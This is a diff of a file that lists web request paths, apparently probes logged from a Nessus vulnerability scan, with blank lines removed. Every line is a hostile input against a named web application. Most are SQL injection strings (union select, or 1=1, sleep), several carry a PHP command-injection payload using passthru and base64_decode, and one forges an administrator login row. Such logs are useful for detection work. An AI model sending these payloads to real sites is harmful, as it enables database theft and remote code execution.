@@ -1,3640 +1,1820 @@
 /cgi-bin/index.php?op=default&date=200607' union select 1,501184215,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1376526276--
-
 /examples/jsp/num/index.php?id='union/**/select/**/0,0,1369222205,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331905182,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 2020390524,2,880987929,4,5,6,7,8,9,0,1,2,3 --
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1164366855--
-
 /phpmyadmin/index.php?op=default&date=200607' union select 1,1265182078,1,1,1,1,1,1,1,1--&blogid=1
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331904183+or+1=1+--+';passthru(base64_decode($_server[http_nessus_0oywsnwb]));die;/*
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332009305',null,null,null,null --
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331908736,1948616015 -- 
-
 /www/delivery/ac.php?bannerid=-1332009302+or+1=1+--+';passthru(base64_decode($_server[http_nessus_dllvu4k6]));die;/*
-
 /en-us/account/index.php?id='union/**/select/**/0,0,1647791366,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 412834017--
-
 /examples/jsp/error/index.php?op=default&date=200607' union select 1,1200541698,1,1,1,1,1,1,1,1--&blogid=1
-
 /mail.php?id='/**/union/**/select/**/1,2,1331919224,4--&blog=1
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331918993',null,null,null,null --
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,1192121872,1,1,1,1,1,1,1,1--&blogid=1
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904240','5'--
-
 /scripts/index.php?id='union/**/select/**/0,0,521532225,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331905123',null,null,null,null --
-
 /manager/index.php?op=default&date=200607' union select 1,1128524552,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/news.php?prevnext=1'phpnews_prevnext_sql_injection.nasl
-
 /scripts/index.php?op=default&date=200607' union select 1,1100287420,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331919202
-
 /cgi-bin/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /examples/jsp/error/faq.php?action=&type=view&s=&id=-1' union select 0,157871866,0,0,0,0,0--
-
 /manager/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,1323875856,0,0,0,0,0--
-
 /banners.php?op=emailstats&cid=1 and passwd like 'a%'/*
-
 /examples/jsp/checkbox/index.php?id='union/**/select/**/0,0,1364632458,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /manager/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,403538393,1441170175,1,1,1,1,1--&blogid=1
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331908835',null,null,null,null --
-
 /index.php?op=default&date=200607' union select 1,1849014202,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/checkbox/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_wfppkgt4]));die;/*
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331909370,1,1,1,1,1,1,1--&blogid=1
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- 
-
 /www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_6drqhnv_]));die;/*
-
 /examples/jsp/jsp2/el/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,1759684664,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/num/faq.php?action=&type=view&s=&id=-1' union select 0,1013365063,0,0,0,0,0--
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1331909424,4--&blog=1
-
 /en-us/account/index.php?op=default&date=200607' union select 1,674790948,1,1,1,1,1,1,1,1--&blogid=1
-
 /manager/faq.php?action=&type=view&s=&id=-1' union select 0,348320449,0,0,0,0,0--
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,763560836,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1331909424,4--&blog=1
-
 /examples/jsp/num/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1332008332,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331923197',null,null,null,null --
-
 /manager/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331919200,0x3a,512612977),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,929714876,0,0,0,0,0--
-
 /index.php?op=default&date=200607' union select 1,1425852379,1,1,1,1,1,1,1,1--&blogid=1
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332010395',null,null,null,null --
-
 /phpmyadmin/documentation.html?phpmyadmin=map47fckapd3c2j9d7svslcjakhdm1fs' and sleep(4)='
-
 /scripts/www/delivery/ac.php?bannerid=-1331908787+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ti5957ae]));die;/*
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332009307,416096840 -- 
-
 /scripts/calendar.php?month=' union select 1,1,'1331904667','calendarix_month_sql_injection.nasl',1 #
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332008334','5'--
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332009307,416096840 -- 
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919009','5'--
-
 /cacti/www/delivery/ac.php?bannerid=-1331909226+or+1=1+--+';passthru(base64_decode($_server[http_nessus_3mwq6imw]));die;/*
-
 /examples/jsp/error/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /cgi-bin/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /scripts/calendar.php?month=' union select 1,1,'1331904225','calendarix_month_sql_injection.nasl',1 #
-
 /en-us/account/index.php?id='union/**/select/**/0,0,1431582502,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1332009307,1854936082 --
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1332009308,1,1510172050--
-
 /phpmyadmin/mail.php?id='/**/union/**/select/**/1,2,1331923205,4--&blog=1
-
 /phpmyadmin/faq.php?action=&type=view&s=&id=-1' union select 0,1385926503,0,0,0,0,0--
-
 /main.php?logout=1' and 1=1 and ''<>'kxshru8u
-
 /scripts/disp_album.php?id_album=0+or+1=1
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332008329',null,null,null,null --
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,169866100570,4,5,6,7,8,9,10,11--
-
 /examples/jsp/cal/faq.php?action=&type=view&s=&id=-1' union select 0,576895199,0,0,0,0,0--
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331905123',null,null,null,null --
-
 /phpmyadmin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,473248912,0,0,0,0,0--
-
 /examples/jsp/sessions/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /examples/jsp/jsp2/jspx/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_na5kufvl]));die;/*
-
 /www/delivery/ac.php?bannerid=-1331919146+or+1=1+--+';passthru(base64_decode($_server[http_nessus_5r89tpqc]));die;/*
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 2080375299--
-
 /index.php?op=default&date=200607' union select 1,379183911,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/cal/calendar.php?month=' union select 1,1,'1331904431','calendarix_month_sql_injection.nasl',1 #
-
 /index.php?op=default&date=200607' union select 1,779875714,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/www/delivery/ac.php?bannerid=-1331908693+or+1=1+--+';passthru(base64_decode($_server[http_nessus_f6pybogs]));die;/*
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,744292830,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331908877,462918967 -- 
-
 /scripts/calendar.php?month=' union select 1,1,'1332010410','calendarix_month_sql_injection.nasl',1 #
-
 /examples/jsp/num/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_itstoxgj]));die;/*
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1332008335,4--&blog=1
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332010410',null,null,null,null --
-
 /phpmyadmin/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_cleauhzy]));die;/*
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331923204','5'--
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1332008331
-
 /examples/jsp/cal/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,601832871808,4,5,6,7,8,9,10,11--
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1332008335,4--&blog=1
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331919200,0x3a,1131566153),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 362784712,2,1572590489,4,5,6,7,8,9,0,1,2,3 --
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1332009306,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 873011444--
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1331908888,4--&blog=1
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,1005695442,0,0,0,0,0--
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331923190+or+1=1+--+';passthru(base64_decode($_server[http_nessus_fi0ljbic]));die;/*
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 1606871912--
-
 /manager/faq.php?action=&type=view&s=&id=-1' union select 0,453988391,0,0,0,0,0--
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331908834',null,null,null,null --
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,86738267,0,0,0,0,0--
-
 /examples/jsp/sessions/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /recordings/faq.php?action=&type=view&s=&id=-1' union select 0,2033566095,0,0,0,0,0--
-
 /scripts/www/delivery/ac.php?bannerid=-1331909226+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ht3beygc]));die;/*
-
 /index.php?id='union/**/select/**/0,0,661699354,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,255056503,0,0,0,0,0--
-
 /scripts/calendar.php?month=' union select 1,1,'1332008331','calendarix_month_sql_injection.nasl',1 #
-
 /en-us/account/faq.php?action=&type=view&s=&id=-1' union select 0,1253662444,0,0,0,0,0--
-
 /scripts/www/delivery/ac.php?bannerid=-665+or+1=1
-
 /en-us/account/index.php?op=default&date=200607' union select 1,1782293471,1,1,1,1,1,1,1,1--&blogid=1
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331918977+or+1=1+--+';passthru(base64_decode($_server[http_nessus_l1_kygob]));die;/*
-
 /www/delivery/ac.php?bannerid=-1332010394+or+1=1+--+';passthru(base64_decode($_server[http_nessus_4bpj1wcm]));die;/*
-
 /mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 435389080,2,2084643622,4,5,6,7,8,9,0,1,2,3 --
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,678642094,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 854943738,2,566710091,4,5,6,7,8,9,0,1,2,3 --
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1332010394+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ybslwkfb]));die;/*
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,1704795451,0,0,0,0,0--
-
 /main.php?stuff=2040844887' and 1=1 and ''<>'vzsvhedu
-
 /examples/jsp/error/index.php?op=default&date=200607' union select 1,1284682657,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332008331,0x3a,892071098),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /phpmyadmin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- 
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 327415864--
-
 /phpmyadmin/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /cgi-bin/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /scripts/www/delivery/ac.php?bannerid=-371+or+1=1
-
 /examples/jsp/colors/mail.php?id='/**/union/**/select/**/1,2,1331904463,4--&blog=1
-
 /index.php?categories=1&cat=xx' union/**/  select '1','412596083481','2','comments' /*
-
 /examples/jsp/sessions/index.php?id='union/**/select/**/0,0,1244365684,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /examples/jsp/cal/mail.php?id='/**/union/**/select/**/1,2,1331904463,4--&blog=1
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,1303050841,0,0,0,0,0--
-
 /scripts/www/delivery/ac.php?bannerid=-193+or+1=1
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1332009308,4,5
-
 /mail.php?id='/**/union/**/select/**/1,2,1332008335,4--&blog=1
-
 /cacti/mail.php?id='/**/union/**/select/**/1,2,1331905235,4--&blog=1
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331923203,1242183873 -- 
-
 /scripts/event_view.php?eid=34 union select 692795576
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331904243,4,5
-
 /scripts/forum.php?forum=-1 union select null,123456,null,null,null,null--
-
 /phpmyadmin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1332010400,529560500 --
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331905220','5'--
-
 /scripts/www/delivery/ac.php?bannerid=-206+or+1=1
-
 /scripts/index.php?id='union/**/select/**/0,0,20217353,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /phpmyadmin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,947023198940,4,5,6,7,8,9,10,11--
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919010','5'--
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,804459550,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/colors/index.php?op=default&date=200607' union select 1,450076443,1,1,1,1,1,1,1,1--&blogid=1
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1332008596+or+1=1+--+';passthru(base64_decode($_server[http_nessus_t6vulpj4]));die;/*
-
 /index.php?id='union/**/select/**/0,0,300412621,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331905234,4,5
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331904237,89676103 --
-
 /cacti/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331908880','5'--
-
 /examples/jsp/colors/faq.php?action=&type=view&s=&id=-1' union select 0,1997959680,0,0,0,0,0--
-
 /examples/jsp/cal/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_gzot_utg]));die;/*
-
 /manager/mail.php?id='/**/union/**/select/**/1,2,1331904463,4--&blog=1
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 469168500--
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 1424302611--
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332010414','5'--
-
 /examples/jsp/checkbox/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /cacti/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,1480204165,1632363387,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331909396,602648682 --
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904238,927121236 -- 
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331905166,0x3a,1536152654),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /examples/jsp/error/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /scripts/www/delivery/ac.php?bannerid=-1332008596+or+1=1+--+';passthru(base64_decode($_server[http_nessus_gd2bness]));die;/*
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331908694+or+1=1+--+';passthru(base64_decode($_server[http_nessus_nagbw8sx]));die;/*
-
 /examples/jsp/jsp2/el/index.php?id='union/**/select/**/0,0,869732329,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1461801666,2,718923871,4,5,6,7,8,9,0,1,2,3 --
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1332010411
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1331923205,4--&blog=1
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332008331,0x3a,892071098),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331904231,1,1,1,1,1,1,1--&blogid=1
-
 /phpmyadmin/www/delivery/ac.php?bannerid=-1332008596+or+1=1+--+';passthru(base64_decode($_server[http_nessus_j63eevk_]));die;/*
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331904216',null,null,null,null --
-
 /examples/jsp/jsp2/el/faq.php?action=&type=view&s=&id=-1' union select 0,963542110,0,0,0,0,0--
-
 /cms/revert-content.php?type=newest&id=1" union all select null,null,11221133,null,null/*
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,1077905216,0,0,0,0,0--
-
 /index.php?id='union/**/select/**/0,0,617137594,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1331908741,4--&blog=1
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332010411,0x3a,1017948332),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,1576609633,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/colors/index.php?id='union/**/select/**/0,0,2034425430,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,768662659,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,595479233,0,0,0,0,0--
-
 /workarea/contentratinggraph.aspx?type=time&view=day&res_type=content&res=1' and cms400_res_sql_injection.nasl --&enddate=5/10/2008 12:00:00 am
-
 /index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /modules.php?name=news&op=rate_complete&sid=1' and 1=0 union/**/ select 'sqlinjection_test&score=5
-
 /scripts/www/delivery/ac.php?bannerid=-636+or+1=1
-
 /examples/jsp/cal/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332008329',null,null,null,null --
-
 /www/delivery/ac.php?bannerid=-1331905039+or+1=1+--+';passthru(base64_decode($_server[http_nessus_jtipnlkz]));die;/*
-
 /recordings/?user=jffnms_user_sql_injection.nasl' union select 2,'admin','$1$rxs1rotx$iza1s3fccfyvfa9rwkbmi.','administrator'--&file=index&pass=
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331923204','5'--
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1331908741,4--&blog=1
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /scripts/www/delivery/ac.php?bannerid=-1331918977+or+1=1+--+';passthru(base64_decode($_server[http_nessus_dv8rullj]));die;/*
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 99859533--
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332008334,1061714587 -- 
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332009306,0x3a,1514709258),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /cacti/faq.php?action=&type=view&s=&id=-1' union select 0,1200572060,0,0,0,0,0--
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1332010411,0x3a,1017948332),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /examples/jsp/num/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331908740,4,5
-
 /mail.php?id='/**/union/**/select/**/1,2,1331909424,4--&blog=1
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,708862898,0,0,0,0,0--
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331923200,0x3a,196871378),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /examples/jsp/cal/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,475189625,0,0,0,0,0--
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,1451427823,0,0,0,0,0--
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331909354,0x3a,1639211458),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331908877,462918967 -- 
-
 /examples/jsp/checkbox/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /scripts/www/delivery/ac.php?bannerid=-1331904221+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ngbfhgz5]));die;/*
-
 /scripts/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /examples/jsp/num/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /scripts/calendar.php?month=' union select 1,1,'1332008330','calendarix_month_sql_injection.nasl',1 #
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1332008323+or+1=1+--+';passthru(base64_decode($_server[http_nessus_xdid48fb]));die;/*
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1332010419,4--&blog=1
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331909312',null,null,null,null --
-
 /cgi-bin/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /index.php?op=default&date=200607' union select 1,262566063,1,1,1,1,1,1,1,1--&blogid=1
-
 /phpmyadmin/faq.php?action=&type=view&s=&id=-1' union select 0,478772920,0,0,0,0,0--
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919010','5'--
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904238,927121236 -- 
-
 /scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331923201,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/checkbox/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /examples/jsp/sessions/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_wkwrzrcc]));die;/*
-
 /scripts/www/delivery/ac.php?bannerid=-62+or+1=1
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919216,1114321675 -- 
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331919183',null,null,null,null --
-
 /examples/jsp/num/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /examples/jsp/checkbox/index.php?id='union/**/select/**/0,0,1141767021,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331908714',null,null,null,null --
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,49499334,0,0,0,0,0--
-
 /examples/servlets/servlet/faq.php?action=&type=view&s=&id=-1' union select 0,385193185,0,0,0,0,0--
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332008335','5'--
-
 /scripts/index.php?op=default&date=200607' union select 1,1900403573,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919219','5'--
-
 /scripts/calendar.php?month=' union select 1,1,'1332009306','calendarix_month_sql_injection.nasl',1 #
-
